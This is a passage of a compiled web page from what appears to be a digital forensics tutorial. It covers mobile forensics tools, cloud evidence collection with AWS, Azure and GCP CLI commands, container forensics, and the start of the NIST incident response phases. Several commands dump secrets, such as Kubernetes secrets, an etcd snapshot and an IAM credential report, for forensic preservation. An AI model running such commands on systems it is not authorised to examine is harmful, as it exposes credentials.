          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$$$$$"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Law enforcement, enterprise IR"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Cellebrite Premium"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Android, iOS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "All UFED + advanced, data analytics"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$$$$$"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Large-scale investigations"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Magnet AXIOM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Android, iOS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Logical, cloud, artifact analysis"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$$$$"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Multi-platform investigations"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Oxygen Forensic Detective"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Android, iOS, Cloud"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Logical, cloud, social media"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$$$$"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Social media investigations"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "MSAB XRY"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Android, iOS, Feature"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Physical, logical, advanced"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$$$$$"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Law enforcement"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Belkasoft Evidence Center"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Android, iOS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Logical, cloud, artifact analysis"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$$$$"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Comprehensive digital investigations"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Elcomsoft Phone Breaker"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "iOS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "iCloud, iTunes backup extraction"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$$$"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud-based iOS extraction"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "ADB (free)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Android"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Logical pull"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Free"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Quick triage, testing"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "LiME (free)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Android (root)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Physical dumps"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Free"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Advanced analysis"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "76-mobile-forensics-workflow",
      children: "7.6 Mobile Forensics Workflow"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Numbered Steps:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Secure the device"
        }), " → Faraday bag to prevent remote wipe and network communication"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Document status"
        }), " → photograph the screen (time, notifications, battery level)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Disable auto-lock"
        }), " → prevent screen lock during acquisition"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Enable airplane mode"
        }), " → prevent incoming calls/messages from overwriting data"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Identify acquisition method"
        }), " → check device model, OS version, lock status, USB debugging"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Perform acquisition"
        }), " → logical, physical, or cloud based on capability and need"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Verify integrity"
        }), " → SHA-256 of acquired image/backup"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Analyze"
        }), " → extract SMS, call logs, contacts, apps, GPS, media, browser history"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Document"
        }), " → chain of custody, acquisition method, findings"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "8-cloud-forensics",
      children: "8. Cloud Forensics"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Real-World Analogy:"
      }), " Traditional forensics is investigating a house after a burglary. Cloud forensics is investigating a house that exists in multiple dimensions simultaneously (compute in one, storage in another, database in a third), may vanish at any moment (auto-scaling terminates instances), has no physical doors you can lock, and where the neighbors (other tenants) control the building's security cameras."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "81-cloud-forensics-challenges",
      children: "8.1 Cloud Forensics Challenges"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Challenge"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Impact"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Mitigation"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Ephemeral evidence"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud instances/containers auto-terminate"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Enable detailed logging before incidents"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Multi-tenancy"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Evidence may co-reside with other tenants"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Approved acquisition channels only"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Jurisdiction"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Data centers in multiple legal jurisdictions"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Know data residency requirements"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Lack of physical access"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cannot do chip-off or JTAG"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud API forensics only"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Shared responsibility"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider manages some evidence"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Understand provider's forensic capabilities"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Volume of data"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud scale = petabytes of logs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Automated analysis pipelines"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "API rate limits"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Evidence export may be throttled"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Plan acquisition sequencing"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Encryption"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "KMS/HSM managed by provider"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Capture from memory or logs before key rotation"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "82-aws-forensics",
      children: "8.2 AWS Forensics"
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "evidence-collection",
      children: "Evidence Collection"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# 1. AWS CloudTrail → API activity logs\naws cloudtrail lookup-events \\\n    --lookup-attributes AttributeKey=ResourceName,AttributeValue=i-0123456789abcdef0 \\\n    --start-time 2024-06-15T14:00:00Z \\\n    --end-time 2024-06-15T16:00:00Z \\\n    --output json > cloudtrail_events.json\n\n# 2. EC2 Instance forensics → create forensic snapshot\naws ec2 create-snapshot \\\n    --volume-id vol-0123456789abcdef0 \\\n    --description \"Forensic snapshot - Case IR-2024-001\" \\\n    --tag-specifications 'ResourceType=snapshot,Tags=[{Key=Case,Value=IR-2024-001}]'\n\n# Create AMI from instance (captures instance state)\naws ec2 create-image \\\n    --instance-id i-0123456789abcdef0 \\\n    --name \"forensic-image-2024-06-15\" \\\n    --description \"Forensic AMI - Case IR-2024-001\" \\\n    --no-reboot\n\n# 3. Launch forensic analysis instance from snapshot\naws ec2 run-instances \\\n    --image-id ami-0abcdef1234567890 \\\n    --block-device-mappings DeviceName=/dev/sdf,Ebs={SnapshotId=snap-0123456789abcdef0} \\\n    --instance-type m5.2xlarge \\\n    --subnet-id subnet-0123456789abcdef0\n\n# 4. S3 forensics → check bucket access logs\naws s3api get-bucket-logging --bucket target-bucket-name\n\n# Enable access logging (if not already)\naws s3api put-bucket-logging \\\n    --bucket target-bucket-name \\\n    --bucket-logging-status '{\"LoggingEnabled\":{\"TargetBucket\":\"forensic-logs-bucket\",\"TargetPrefix\":\"s3-access-logs/\"}}'\n\n# 5. VPC Flow Logs → network traffic\n# Check if flow logs are enabled\naws ec2 describe-flow-logs \\\n    --filter \"Name=resource-id,Values=vpc-0123456789abcdef0\"\n\n# Export flow logs to S3\naws s3 cp s3://flow-log-bucket/flow-logs/ /evidence/aws-flow-logs/ --recursive\n\n# 6. GuardDuty findings\naws guardduty list-findings --detector-id 0123456789abcdef0\naws guardduty get-findings \\\n    --detector-id 0123456789abcdef0 \\\n    --finding-ids file://findings-list.json\n\n# 7. IAM credential report (user access review)\naws iam generate-credential-report\naws iam get-credential-report --output text --query CredentialReportContent | base64 -d > credential-report.csv\n\n# 8. Lambda function code retrieval\naws lambda get-function --function-name suspicious-function --output json > function-config.json\naws lambda get-function --function-name suspicious-function --query 'Code.Location' --output text > function-url.txt\n# Download the function code from the URL in function-url.txt\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "aws-forensic-artifacts",
      children: "AWS Forensic Artifacts"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Service"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Evidence Source"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Forensic Value"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CloudTrail"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Management API events"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Who did what, when, from where (source IP)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CloudWatch Logs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Application logs, VPC Flow Logs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "System-level activity"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "S3 Access Logs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Object-level access"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Data exfiltration detection"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Config"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Resource configuration history"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Infrastructure changes"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "GuardDuty"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Threat detection findings"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Known malicious activity detection"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "VPC Flow Logs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Network metadata"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Lateral movement, data exfiltration"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "EC2 Snapshots"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Disk state at point-in-time"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full disk forensics"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Inspector"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Vulnerability assessment"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Known vulnerabilities in instances"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Trusted Advisor"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Best practice checks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security configuration gaps"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Secrets Manager"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Access logs for secrets"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Credential access detection"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "83-azure-forensics",
      children: "8.3 Azure Forensics"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# 1. Azure Activity Log\n# Portal: Monitor → Activity Log → Export to Event Hub or Log Analytics\n# CLI:\naz monitor activity-log list \\\n    --resource-id /subscriptions/SUBSCRIPTION_ID/resourceGroups/RG_NAME \\\n    --start-time 2024-06-15T14:00:00Z \\\n    --end-time 2024-06-15T16:00:00Z \\\n    --output json > azure_activity_log.json\n\n# 2. Virtual Machine disk snapshot\naz snapshot create \\\n    --resource-group RG_NAME \\\n    --name forensic-snapshot-vm01 \\\n    --source /subscriptions/SUBSCRIPTION_ID/resourceGroups/RG_NAME/providers/Microsoft.Compute/disks/vm01_OsDisk_1\n\n# Create disk from snapshot for analysis\naz disk create \\\n    --resource-group RG_NAME \\\n    --name forensic-disk-vm01 \\\n    --source forensic-snapshot-vm01\n\n# Attach to analysis VM\naz vm disk attach \\\n    --vm-name analysis-vm \\\n    --resource-group RG_NAME \\\n    --name forensic-disk-vm01\n\n# 3. Azure AD sign-in logs (Microsoft Graph)\n# Requires Azure AD Premium P1/P2\n# Portal: Azure AD → Sign-in logs → Export\n# PowerShell:\nConnect-AzureAD\nGet-AzureADAuditSignInLogs -Filter \"createdDateTime ge 2024-06-15\" -Top 1000 | Export-Csv signin_logs.csv\n\n# 4. NSG Flow Logs\n# Check if enabled on Network Security Groups\naz network watcher flow-log list --location eastus\n\n# 5. Key Vault audit logs\naz monitor diagnostic-settings list --resource /subscriptions/SUBSCRIPTION_ID/resourceGroups/RG_NAME/providers/Microsoft.KeyVault/vaults/VAULT_NAME\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "84-gcp-forensics",
      children: "8.4 GCP Forensics"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# 1. Cloud Audit Logs\n# Using gcloud CLI\ngcloud logging read \"resource.type=gce_instance AND timestamp>=\\\"2024-06-15T14:00:00Z\\\"\" \\\n    --project PROJECT_ID \\\n    --limit 1000 \\\n    --format json > gcp_audit_logs.json\n\n# 2. Compute Engine disk snapshot\ngcloud compute disks snapshot DISK_NAME \\\n    --zone us-central1-a \\\n    --snapshot-names forensic-snapshot-gce-01 \\\n    --description \"Forensic snapshot - Case IR-2024-001\"\n\n# Create disk from snapshot for analysis\ngcloud compute disks create forensic-disk-gce-01 \\\n    --source-snapshot forensic-snapshot-gce-01 \\\n    --zone us-central1-a\n\n# Attach to analysis instance\ngcloud compute instances attach-disk analysis-instance \\\n    --disk forensic-disk-gce-01 \\\n    --zone us-central1-a\n\n# 3. VPC Flow Logs\ngcloud compute networks subnets describe SUBNET_NAME \\\n    --region us-central1 \\\n    --format \"json(enableFlowLogs,logConfig)\"\n\n# Export flow logs from Stackdriver\ngcloud logging read \"resource.type=gce_subnetwork AND jsonPayload.reporter=DEST\" \\\n    --project PROJECT_ID \\\n    --limit 10000 \\\n    --format json > gcp_flow_logs.json\n\n# 4. Cloud Storage audit logs (Data Access)\n# Check bucket's IAM policy\ngsutil iam get gs://BUCKET_NAME\n\n# Access logs (enable via bucket logging)\ngsutil logging set on -b forensic-logs-bucket -o access-log gs://TARGET_BUCKET\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "85-cloud-forensic-workflow",
      children: "8.5 Cloud Forensic Workflow"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Numbered Steps:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Identify scope"
        }), " → which services, regions, accounts are involved"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Preserve logs"
        }), " → export CloudTrail/Activity/Audit Logs immediately (retention may vary)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Snapshot storage"
        }), " → create EBS snapshots, disk images, and storage exports"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Capture network data"
        }), " → enable VPC flow logs, export NSG logs, capture mirror traffic"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Preserve IAM state"
        }), " → export IAM policies, roles, users, service accounts"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Capture memory (if possible)"
        }), " → use SSM Run Command or custom agents for RAM acquisition"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Isolate compromised resources"
        }), " → apply security groups, detach IAM policies, disable keys"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Analyze in isolated environment"
        }), " → launch analysis instances in separate account/VPC"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "86-container-forensics-dockerkubernetes",
      children: "8.6 Container Forensics (Docker/Kubernetes)"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Docker container forensics\n# Save container filesystem\ndocker export CONTAINER_ID > container_fs.tar\n\n# Commit container to image (preserves state)\ndocker commit CONTAINER_ID forensic-image:tag\n\n# Save image as tar\ndocker save forensic-image:tag -o forensic-image.tar\n\n# View container logs\ndocker logs CONTAINER_ID > container_logs.txt\n\n# Analyze container layers\ndocker history IMAGE_NAME\n\n# Kubernetes forensics\n# Get pod logs\nkubectl logs POD_NAME -n NAMESPACE --since=2h > pod_logs.txt\n\n# Describe pod (events, status)\nkubectl describe pod POD_NAME -n NAMESPACE\n\n# Get pod YAML definition\nkubectl get pod POD_NAME -n NAMESPACE -o yaml\n\n# Get cluster events\nkubectl get events -n NAMESPACE --sort-by=.lastTimestamp\n\n# Extract secrets (requires permissions)\nkubectl get secrets -n NAMESPACE -o yaml\n\n# Export etcd data (cluster database)\n# Requires SSH to etcd pod/VM\nETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key \\\n  snapshot save etcd-snapshot.db\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "9-incident-response-lifecycle-nist-sp-800-61",
      children: "9. Incident Response Lifecycle (NIST SP 800-61)"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Real-World Analogy:"
      }), " A hospital emergency room follows a structured protocol: triage (preparation), diagnose (detection), stabilize (containment), treat (eradication), discharge (recovery), and review (post-incident). IR is the ER for your organization's digital health → and following the protocol prevents panic-induced mistakes."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "91-the-four-phases",
      children: "9.1 The Four Phases"
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "phase-1-preparation",
      children: "Phase 1: Preparation"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Goal:"
      }), " Establish the tools, team, and processes before an incident occurs. This phase determines whether your response will be effective or chaotic."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Key Activities:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Activity"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Success Criteria"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CSIRT Formation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Identify team members, roles, backup personnel"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Defined RACI matrix"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "IR Plan Creation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Document procedures for incident types"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Approved document, reviewed annually"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Tool Deployment"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SIEM, EDR, logging, forensics workstations"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Tools installed and tested"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Playbook Development"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Step-by-step guides for common scenarios"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Tested in tabletop exercises"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Communication Plan"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Stakeholder notification matrix, legal contacts"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Contact list tested quarterly"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Training"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Team exercises, certifications"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "All members pass annual exercise"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Threat Intelligence"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Feeds, sharing partnerships"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Integrated with SIEM"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Legal Counsel Engagement"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Pre-approved counsel for incident matters"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Retainer in place"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Tabletop Exercise Scenario:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Scenario: Ransomware\nTeam: SOC analyst, IR lead, Legal, PR, IT, Exec sponsor\nFlow:\n1. SOC receives alert: file encryption detected on 5 workstations\n2. SOC analyst follows playbook: isolate, screenshot, escalate\n3. IR lead: determine scope, activate CSIRT, notify legal\n4. Legal: mandatory breach notification assessment\n5. IT: begin system restoration from clean backups\n6. PR: prepare customer notification statement\n7. Exec: approve ransom/no-ransom decision\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Tool Commands → Preparation:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# Configure centralized logging (syslog-ng)\ncat /etc/syslog-ng/conf.d/remote.conf\n# source s_net { tcp(ip(0.0.0.0) port(514)); };\n# destination d_files { file(\"/var/log/remote/${HOST}/${FACILITY}.log\"); };\n# log { source(s_net); destination(d_files); };\n\n# Deploy Sysmon on Windows endpoints (sysmon)\nsysmon64.exe -accepteula -i sysmon-config.xml\n\n# Deploy osquery\nosqueryi --json \"SELECT * FROM os_version;\"\nosqueryi --json \"SELECT * FROM processes;\"\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "phase-2-detection--analysis",
      children: "Phase 2: Detection & Analysis"
